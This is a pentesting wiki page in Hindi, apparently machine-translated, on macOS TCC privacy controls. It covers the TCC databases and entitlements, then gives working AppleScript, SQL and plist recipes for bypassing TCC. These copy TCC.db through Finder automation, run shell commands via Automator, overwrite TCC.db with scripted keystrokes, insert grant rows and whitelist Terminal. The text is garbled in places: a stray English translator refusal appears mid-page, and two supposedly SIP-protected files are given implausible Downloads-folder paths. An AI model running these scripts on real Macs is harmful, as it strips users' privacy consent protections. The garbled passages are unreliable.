```markdown
# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **cybersecurity company** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) या [**telegram group**](https://t.me/peass) में शामिल हों** या **Twitter** पर मुझे **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **hacktricks repo** और **hacktricks-cloud repo** में PRs सबमिट करके अपनी hacking tricks साझा करें।

</details>

## **मूल जानकारी**

**TCC (Transparency, Consent, and Control)** macOS में एक तंत्र है जो **विशेष सुविधाओं तक एप्लिकेशन की पहुँच को सीमित और नियंत्रित करता है**, आमतौर पर गोपनीयता के दृष्टिकोण से। इसमें लोकेशन सर्विसेज, संपर्क, फोटो, माइक्रोफोन, कैमरा, एक्सेसिबिलिटी, पूर्ण डिस्क एक्सेस और बहुत कुछ शामिल हो सकता है।

उपयोगकर्ता के दृष्टिकोण से, जब कोई एप्लिकेशन TCC द्वारा संरक्षित किसी सुविधा तक पहुँच चाहता है तो वे TCC को क्रिया में देखते हैं। जब ऐसा होता है तो **उपयोगकर्ता को एक संवाद बॉक्स प्रदर्शित होता है** जो उनसे पूछता है कि क्या वे पहुँच की अनुमति देना चाहते हैं या नहीं।

यह भी संभव है कि **एप्लिकेशन्स को फाइलों तक पहुँच दी जाए** उपयोगकर्ताओं के **स्पष्ट इरादों** से, उदाहरण के लिए जब एक उपयोगकर्ता **एक फाइल को किसी प्रोग्राम में ड्रैग\&ड्रॉप करता है** (स्पष्ट है कि प्रोग्राम को इसकी पहुँच होनी चाहिए)।

![TCC प्रॉम्प्ट का एक उदाहरण](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` में स्थित **daemon** द्वारा संभाला जाता है और `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` में कॉन्फ़िगर किया गया है (mach service `com.apple.tccd.system` को रजिस्टर करता है)।

एक **user-mode tccd** होता है जो प्रत्येक लॉग इन किए गए उपयोगकर्ता के लिए `/System/Library/LaunchAgents/com.apple.tccd.plist` में परिभाषित होता है जो mach services `com.apple.tccd` और `com.apple.usernotifications.delegate.com.apple.tccd` को रजिस्टर करता है।

यहाँ आप system और user के रूप में चल रहे tccd को देख सकते हैं:
```
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
अनुमतियाँ **मूल एप्लिकेशन से विरासत में मिली होती हैं** और अनुमतियाँ **बंडल ID** और **डेवलपर ID** के आधार पर **ट्रैक की जाती हैं**।

### TCC डेटाबेस

अनुमतियाँ/अस्वीकृतियाँ फिर कुछ TCC डेटाबेस में संग्रहीत की जाती हैं:

* सिस्टम-व्यापी डेटाबेस **`/Library/Application Support/com.apple.TCC/TCC.db`** में।
* यह डेटाबेस **SIP संरक्षित** है, इसलिए केवल SIP बायपास ही इसमें लिख सकता है।
* प्रति-उपयोगकर्ता प्राथमिकताओं के लिए उपयोगकर्ता TCC डेटाबेस **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**।
* यह डेटाबेस संरक्षित है इसलिए केवल उच्च TCC विशेषाधिकार वाली प्रक्रियाएँ जैसे कि Full Disk Access ही इसमें लिख सकती हैं (लेकिन यह SIP द्वारा संरक्षित नहीं है)।

{% hint style="warning" %}
पिछले डेटाबेस भी **पढ़ने के लिए TCC संरक्षित हैं**। इसलिए आप अपने सामान्य उपयोगकर्ता TCC डेटाबेस को नहीं पढ़ पाएंगे जब तक कि यह एक TCC विशेषाधिकार वाली प्रक्रिया से न हो।

हालांकि, याद रखें कि इन उच्च विशेषाधिकारों वाली प्रक्रिया (जैसे कि **FDA** या **`kTCCServiceEndpointSecurityClient`**) उपयोगकर्ता के TCC डेटाबेस में लिख सकती है।
{% endhint %}

* **`/var/db/locationd/clients.plist`** में एक **तीसरा** TCC डेटाबेस है जो **स्थान सेवाओं के उपयोग की अनुमति वाले ग्राहकों** को दर्शाता है।
* SIP संरक्षित फ़ाइल **`/Users/carlospolop/Downloads/REG.db`** (TCC के साथ पढ़ने के लिए भी संरक्षित), सभी **वैध TCC डेटाबेसों** के **स्थान** को समाहित करती है।
* SIP संरक्षित फ़ाइल **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (TCC के साथ पढ़ने के लिए भी संरक्षित), अधिक TCC अनुमतियों को समाहित करती है।
* SIP संरक्षित फ़ाइल **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (लेकिन किसी भी व्यक्ति द्वारा पढ़ी जा सकती है) एक अनुमति सूची है जो एप्लिकेशनों को TCC अपवाद की आवश्यकता होती है।&#x20;

{% hint style="success" %}
**iOS** में TCC डेटाबेस **`/private/var/mobile/Library/TCC/TCC.db`** में है।
{% endhint %}

{% hint style="info" %}
**नोटिफिकेशन सेंटर UI** सिस्टम TCC डेटाबेस में **परिवर्तन कर सकता है**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

हालांकि, उपयोगकर्ता **नियमों को हटा सकते हैं या पूछताछ कर सकते हैं** **`tccutil`** कमांड लाइन उपयोगिता के साथ।
{% endhint %}

#### डेटाबेस की पूछताछ करें

{% tabs %}
{% tab title="user DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
Since the content to be translated is not provided, I'm unable to proceed with the translation. Please provide the English text that you would like to have translated into Hindi.
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
दोनों डेटाबेस की जांच करके आप यह देख सकते हैं कि किसी ऐप ने कौन सी अनुमतियां स्वीकार की हैं, किन्हें मना किया है, या नहीं है (वह इसके लिए पूछेगा)।
{% endhint %}

* **`service`** TCC **अनुमति** का स्ट्रिंग प्रतिनिधित्व है
* **`client`** अनुमतियों वाला **bundle ID** या **बाइनरी का पथ** है
* **`client_type`** यह दर्शाता है कि यह एक Bundle Identifier(0) है या एक पूर्ण पथ(1)

<details>

<summary>यदि यह एक पूर्ण पथ है तो कैसे निष्पादित करें</summary>

बस **`launctl load you_bin.plist`** करें, एक plist के साथ जैसे:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
<details>

* **`auth_value`** विभिन्न मान ले सकता है: denied(0), unknown(1), allowed(2), या limited(3).
* **`auth_reason`** निम्नलिखित मान ले सकता है: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* **csreq** क्षेत्र यह इंगित करने के लिए है कि कैसे बाइनरी को सत्यापित करने और TCC अनुमतियाँ प्रदान करने के लिए:

</details>
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* अधिक जानकारी के लिए तालिका के **अन्य फील्ड्स** के बारे में [**इस ब्लॉग पोस्ट को देखें**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

आप `System Preferences --> Security & Privacy --> Privacy --> Files and Folders` में **पहले से दी गई अनुमतियों** को भी देख सकते हैं।

{% hint style="success" %}
उपयोगकर्ता **`tccutil`** का उपयोग करके **नियमों को हटा सकते हैं या जांच सकते हैं**।
{% endhint %}

#### TCC अनुमतियों को रीसेट करें
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC हस्ताक्षर जांच

TCC **डेटाबेस** एप्लिकेशन के **Bundle ID** को संग्रहीत करता है, परंतु यह **जानकारी** भी **संग्रहीत** करता है कि **हस्ताक्षर** के बारे में **सुनिश्चित** करने के लिए कि अनुमति का उपयोग करने के लिए पूछने वाला ऐप सही है।

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
इसलिए, एक ही नाम और बंडल ID वाले अन्य एप्लिकेशन्स दूसरे एप्स को दिए गए अनुमतियों तक पहुँचने में सक्षम नहीं होंगे।
{% endhint %}

### Entitlements & TCC Permissions

एप्लिकेशन्स को **केवल अनुरोध करने की जरूरत नहीं होती** और कुछ संसाधनों तक पहुँचने के लिए **अनुमति प्राप्त की जाती है**, उन्हें **संबंधित entitlements भी होनी चाहिए**।\
उदाहरण के लिए **Telegram** के पास कैमरा तक पहुँच के लिए अनुरोध करने के लिए entitlement `com.apple.security.device.camera` है। एक **एप्लिकेशन** जिसके पास यह **entitlement नहीं है** वह कैमरा तक पहुँचने में सक्षम **नहीं होगा** (और उपयोगकर्ता से अनुमतियों के लिए भी नहीं पूछा जाएगा)।

हालांकि, एप्लिकेशन्स को `~/Desktop`, `~/Downloads` और `~/Documents` जैसे **कुछ उपयोगकर्ता फोल्डर्स** तक **पहुँचने के लिए** किसी विशेष **entitlements की जरूरत नहीं होती है।** सिस्टम स्वचालित रूप से पहुँच को संभालेगा और जरूरत पड़ने पर **उपयोगकर्ता को संकेत देगा**।

Apple के एप्लिकेशन्स **संकेत उत्पन्न नहीं करेंगे**। उनमें उनकी **entitlements सूची में पूर्व-अनुमत अधिकार** होते हैं, जिसका अर्थ है कि वे **कभी भी पॉपअप उत्पन्न नहीं करेंगे**, **न ही** वे किसी भी **TCC डेटाबेस में दिखाई देंगे।** उदाहरण के लिए:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
इससे कैलेंडर को यूजर से रिमाइंडर्स, कैलेंडर और एड्रेस बुक तक पहुंचने के लिए पूछने से बचा जा सकेगा।

{% hint style="success" %}
कुछ आधिकारिक दस्तावेजों के अलावा, एंटाइटलमेंट्स के बारे में **अनौपचारिक रोचक जानकारी** भी [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) पर मिल सकती है।
{% endhint %}

कुछ TCC अनुमतियां हैं: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... इन सभी की एक सार्वजनिक सूची नहीं है लेकिन आप इस [**ज्ञात सूची**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) को देख सकते हैं।

### संवेदनशील असुरक्षित स्थान

* $HOME (स्वयं)
* $HOME/.ssh, $HOME/.aws, आदि
* /tmp

### यूजर इरादा / com.apple.macl

पहले उल्लेखित अनुसार, यह संभव है कि **एक फाइल को उसे ड्रैग एंड ड्रॉप करके एक ऐप को एक्सेस दिया जा सकता है**। यह एक्सेस किसी भी TCC डेटाबेस में निर्दिष्ट नहीं होगा लेकिन एक **विस्तारित** **फाइल के गुण के रूप में**। यह गुण **अनुमति प्राप्त ऐप का UUID स्टोर करेगा**।
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
यह जिज्ञासा की बात है कि **`com.apple.macl`** विशेषता का प्रबंधन **Sandbox** द्वारा किया जाता है, tccd द्वारा नहीं।

यह भी ध्यान दें कि यदि आप एक फाइल को जो आपके कंप्यूटर में एक ऐप के UUID की अनुमति देती है, एक अलग कंप्यूटर में स्थानांतरित करते हैं, क्योंकि वही ऐप विभिन्न UIDs के साथ होगा, वह उस ऐप को उस फाइल तक पहुँच प्रदान नहीं करेगा।
{% endhint %}

विस्तारित विशेषता `com.apple.macl` **साफ़ नहीं की जा सकती** क्योंकि यह **SIP द्वारा सुरक्षित है**। हालांकि, [**इस पोस्ट में बताया गया है**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), इसे अक्षम करना संभव है फाइल को **ज़िप करके**, **हटाकर** और **अनज़िप करके**।

## TCC Privesc & Bypasses

### TCC में प्रविष्टि करें

यदि किसी बिंदु पर आप TCC डेटाबेस पर लिखने की पहुँच प्राप्त कर लेते हैं, तो आप निम्नलिखित का उपयोग करके एक प्रविष्टि जोड़ सकते हैं (टिप्पणियों को हटा दें):

<details>

<summary>TCC में प्रविष्टि करने का उदाहरण</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### स्वचालन से FDA\*

TCC का स्वचालन अनुमति नाम है: **`kTCCServiceAppleEvents`**\
यह विशिष्ट TCC अनुमति यह भी दर्शाती है कि **कौन सा एप्लिकेशन प्रबंधित किया जा सकता है** TCC डेटाबेस के अंदर (इसलिए अनुमतियाँ सिर्फ सब कुछ प्रबंधित करने की अनुमति नहीं देती हैं)।

**Finder** एक ऐसा एप्लिकेशन है जिसके पास **हमेशा FDA होता है** (भले ही यह UI में न दिखाई दे), इसलिए यदि आपके पास इस पर **स्वचालन** विशेषाधिकार हैं, तो आप इसके विशेषाधिकारों का दुरुपयोग करके **कुछ क्रियाएँ करवा सकते हैं**।\
इस मामले में आपके एप्लिकेशन को **`com.apple.Finder`** पर **`kTCCServiceAppleEvents`** की अनुमति की आवश्यकता होगी।

{% tabs %}
{% tab title="Steal users TCC.db" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}

{% tab title="Steal systems TCC.db" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}
{% endtabs %}

आप इसका दुरुपयोग करके **अपना स्वयं का उपयोगकर्ता TCC डेटाबेस लिख सकते हैं**।

{% hint style="warning" %}
इस अनुमति के साथ आप **finder से TCC प्रतिबंधित फ़ोल्डरों तक पहुँचने के लिए कह सकते हैं** और आपको फ़ाइलें दे सकते हैं, लेकिन जहाँ तक मुझे पता है आप **Finder को मनमाना कोड निष्पादित करने के लिए नहीं बना पाएंगे** ताकि उसके FDA एक्सेस का पूर्ण दुरुपयोग कर सकें।

इसलिए, आप FDA क्षमताओं का पूर्ण दुरुपयोग नहीं कर पाएंगे।
{% endhint %}

यह TCC प्रॉम्प्ट Finder पर Automation विशेषाधिकार प्राप्त करने के लिए है:

<figure><img src="../../../../.gitbook/assets/image (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
ध्यान दें कि **Automator** ऐप के पास TCC अनुमति **`kTCCServiceAppleEvents`** है, इसलिए यह **किसी भी ऐप को नियंत्रित कर सकता है**, जैसे कि Finder। इसलिए Automator को नियंत्रित करने की अनुमति होने से आप नीचे दिए गए कोड की तरह **Finder** को भी नियंत्रित कर सकते हैं:
{% endhint %}

<details>

<summary>Automator के अंदर एक shell प्राप्त करें</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
<details>

वही **Script Editor app** के साथ होता है, यह Finder को नियंत्रित कर सकता है, लेकिन AppleScript का उपयोग करके आप इसे स्क्रिप्ट निष्पादित करने के लिए मजबूर नहीं कर सकते।

### Automation + Accessibility (**`kTCCServicePostEvent`**) से FDA\*

**`System Events`** पर Automation + Accessibility (**`kTCCServicePostEvent`**) **प्रक्रियाओं को कीस्ट्रोक्स भेजने** की अनुमति देता है। इस तरह आप Finder का दुरुपयोग करके उपयोगकर्ता के TCC.db को बदल सकते हैं या किसी मनमाने ऐप को FDA दे सकते हैं (हालांकि इसके लिए पासवर्ड की प्रॉम्प्ट हो सकती है)।

Finder द्वारा उपयोगकर्ता के TCC.db को ओवरराइट करने का उदाहरण:
</details>
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### **Endpoint Security Client से FDA तक**

यदि आपके पास **`kTCCServiceEndpointSecurityClient`** है, तो आपके पास FDA है। समाप्त।

### System Policy SysAdmin File से FDA तक

**`kTCCServiceSystemPolicySysAdminFiles`** उपयोगकर्ता के **`NFSHomeDirectory`** विशेषता को **बदलने** की अनुमति देता है, जो उसके होम फोल्डर को बदलता है और इस प्रकार TCC को **बायपास** करने की अनुमति देता है।

### User TCC DB से FDA तक

उपयोगकर्ता TCC डेटाबेस पर **लिखने की अनुमति** प्राप्त करके आप खुद को **`FDA`** अनुमतियाँ नहीं दे सकते, केवल वही जो सिस्टम डेटाबेस में रहता है वह यह अनुमति दे सकता है।

लेकिन आप खुद को **`Finder के लिए Automation अधिकार`** दे सकते हैं, और पिछली तकनीक का दुरुपयोग करके FDA तक बढ़ा सकते हैं\*।

### **FDA से TCC अनुमतियों तक**

**Full Disk Access** का TCC नाम **`kTCCServiceSystemPolicyAllFiles`** है

मुझे नहीं लगता कि यह एक वास्तविक privesc है, लेकिन यदि आपको यह उपयोगी लगे: यदि आप FDA के साथ एक प्रोग्राम को नियंत्रित करते हैं तो आप **उपयोगकर्ता के TCC डेटाबेस को संशोधित कर सकते हैं और खुद को कोई भी एक्सेस दे सकते हैं**। यह एक पर्सिस्टेंस तकनीक के रूप में उपयोगी हो सकता है यदि आप अपनी FDA अनुमतियाँ खो सकते हैं।

### **SIP Bypass से TCC Bypass तक**

सिस्टम **TCC डेटाबेस** **SIP** द्वारा संरक्षित है, इसलिए केवल उन प्रक्रियाओं के साथ **इंडिकेटेड एंटाइटलमेंट्स** होने पर ही इसे संशोधित करने में सक्षम होंगे। इसलिए, यदि एक हमलावर को **SIP बायपास** मिलता है एक **फाइल** पर (SIP द्वारा प्रतिबंधित एक फाइल को संशोधित करने में सक्षम हो), वह सक्षम होगा:

* TCC डेटाबेस की सुरक्षा को **हटाने** के लिए, और खुद को सभी TCC अनुमतियाँ देने के लिए। वह इन फाइलों में से किसी का भी दुरुपयोग कर सकता है, उदाहरण के लिए:
* TCC सिस्टम्स डेटाबेस
* REG.db
* MDMOverrides.plist

हालांकि, TCC को बायपास करने के लिए इस **SIP बायपास** का दुरुपयोग करने का एक और विकल्प है, फाइल `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` एक अनुमति सूची है जिसमें ऐसे एप्लिकेशन हैं जिन्हें TCC अपवाद की आवश्यकता होती है। इसलिए, यदि एक हमलावर इस फाइल से **SIP सुरक्षा को हटा सकता है** और अपना **खुद का एप्लिकेशन** जोड़ सकता है तो एप्लिकेशन TCC को बायपास करने में सक्षम होगा।\
उदाहरण के लिए टर्मिनल जोड़ने के लिए:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC बायपास

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## संदर्भ

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) में शामिल हों या [**telegram group**](https://t.me/peass) में या मुझे **Twitter** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, [**hacktricks repo**](https://github.com/carlospolop/hacktricks) और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके।**

</details>
